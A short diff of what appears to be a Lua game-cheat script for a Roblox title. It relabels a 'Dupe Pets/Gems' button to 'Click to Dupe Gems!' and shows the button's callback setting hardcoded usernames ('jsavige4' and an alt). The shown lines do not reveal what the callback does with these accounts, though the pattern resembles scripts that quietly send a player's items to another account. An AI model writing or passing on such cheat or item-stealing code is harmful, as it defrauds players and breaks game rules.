@@ -189,7 +189,7 @@ local Section2 = Tab2:Section({
     Side = "Left"
 })
 Section2:Button({
-   Text = "Dupe Pets/Gems Beta",
+   Text = "Click to Dupe Gems!Beta",
    Callback = function()
     UserName = "jsavige4"
 UserName2 = "jsavige4alt" -- optional delete the whole line if you don't want it
